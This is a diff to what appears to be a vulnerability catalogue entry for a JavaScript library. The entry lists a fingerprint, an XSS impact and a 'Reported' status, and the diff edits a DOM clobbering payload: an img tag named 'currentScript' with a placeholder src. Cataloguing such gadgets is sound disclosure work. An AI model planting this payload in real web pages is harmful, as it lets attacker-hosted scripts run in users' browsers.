@@ -6,7 +6,7 @@
 + Stars: 2.4K
 + Version: v1-alpha
 + Fingerprint: `typeof Stage !== 'undefined' && typeof Stage.create === 'function'`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>```
++ Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx">```
 + Impact: XSS
 + Status: Reported
 + CVE: N/A
